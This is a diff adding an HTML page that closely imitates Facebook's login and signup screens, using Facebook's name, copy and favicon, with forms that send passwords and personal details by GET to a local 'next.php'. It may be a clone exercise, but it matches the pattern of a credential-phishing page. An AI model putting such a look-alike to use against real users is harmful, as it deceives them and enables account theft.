@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook</title>
+    <link
+      rel="icon"
+      href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
+      type="image/x-icon"
+    />
+    <link href="./src/input.css" rel="stylesheet" />
+  </head>
+  <body class="bg-gray-200">
+    <section class="bg-gray-200">
+      <section>
+        <div class="pt-8">
+          <h4 class="text-center text-6xl text-blue-600 font-bold mb-4">
+            facebook
+          </h4>
+          <p class="text-center font-normal text-2xl">
+            Facebook helps you connect and <br />
+            share with the people in your life.
+          </p>
+        </div>
+      </section>
+      <form action="next.php" method="GET" name="loginForm" class="">
+        <section class="max-w-sm mx-auto border bg-white my-8">
+          <div class="p-2 px-8 mt-4">
+            <input
+              type="email"
+              id="userName"
+              name="email"
+              placeholder="Email address or phone number"
+              class="p-4 border border-gray-400 hover:border-blue-400 w-80"
+              required
+            />
+          </div>
+          <div class="p-2 px-8 mt-1">
+            <input
+              type="password"
+              id="password"
+              required
+              name="password"
+              placeholder="Password"
+              class="p-4 border border-gray-400 hover:border-blue-400 w-80"
+            />
+          </div>
+          <div class="p-2 px-8">
+            <button
+              type="submit"
+              class="border border-blue-800 cursor-pointer w-80 p-3 text-center bg-blue-600 rounded text-xl font-extrabold text-white"
+            >
+              Log in
+            </button>
+
+            <div class="text-center my-4">
+              <a href="#" class="text-blue-700">Forgotten password?</a>
+            </div>
+          </div>
+          <div class="border-b-2 border-gray-200 mt-1 mb-5"></div>
+          <section class="flex justify-center">
+            <button
+              type="button"
+              id="createBtn"
+              class="border border-green-500 w-52 p-3 text-center bg-green-400 rounded mb-6 text-white font-semibold"
+            >
+              Create new account
+            </button>
+          </section>
+        </section>
+        <section>
+          <div class="max-w-sm mx-auto text-center">
+            <p>
+              <span class="font-semibold">Create a Page</span> for a celebrity,
+              brand or business.
+            </p>
+          </div>
+        </section>
+      </form>
+
+      <section class="hidden" id="createPage">
+        <div class="mx-auto max-w-sm my-5" id="response">
+          <form action="next.php" method="GET" name="signupForm">
+            <h1 class="text-3xl font-extrabold mb-2">Sign Up</h1>
+            <h2 class="mb-3 text-gray-700">It's quick and easy.</h2>
+            <div class="space-y-3 space-x-1">
+              <div>
+                <input
+                  type="text"
+                  name="firstName"
+                  required
+                  placeholder="First Name"
+                  class="p-1"
+                />
+                <input
+                  type="text"
+                  name="surName"
+                  required
+                  placeholder="Surname"
+                  class="p-1"
+                />
+              </div>
+
+              <input
+                type="text"
+                name="email"
+                required
+                placeholder="Mobile number or email address"
+                class="p-1 max-w-sm w-full"
+              />
+              <input
+                type="password"
+                name="password"
+                required
+                placeholder="New Password"
+                class="p-1 max-w-sm w-full"
+              />
+              <label>Date of birth</label>
+              <input
+                type="date"
+                name="dob"
+                class="p-2 rounded-xl outline-none"
+                required
+              />
+              <br />
+              <div id="gender" class="flex space-x-6">
+                <label>Gender</label>
+                <div>
+                  <label>
+                    <input type="radio" name="gender" value="male" /> Male
+                  </label>
+                </div>
+                <div>
+                  <label>
+                    <input type="radio" name="gender" value="female" /> Female
+                  </label>
+                </div>
+                <div>
+                  <label>
+                    <input type="radio" name="gender" value="custom" /> Custom
+                  </label>
+                </div>
+              </div>
+              <div class="text-sm text-gray-400 space-y-2">
+                <p>
+                  People who use our service may have uploaded your contact
+                  information to Facebook.
+                  <span class="text-blue-400 cursor-pointer">Learn more.</span>
+                </p>
+                <p>
+                  By clicking Sign Up, you agree to our
+                  <span class="text-blue-400 cursor-pointer">Terms</span> ,
+                  <span class="text-blue-400 cursor-pointer"
+                    >Privacy Policy</span
+                  >
+                  and
+                  <span class="text-blue-400 cursor-pointer"
+                    >Cookies Policy</span
+                  >. You may receive SMS notifications from us and can opt out
+                  at any time.
+                </p>
+              </div>
+              <div class="text-center">
+                <button
+                  type="submit"
+                  id="signUp"
+                  class="bg-green-500 hover:bg-green-400 p-4 rounded-md text-white text-bold"
+                >
+                  Sign Up
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </section>
+    </section>
+    <script src="./main.js"></script>
+  </body>
+</html>
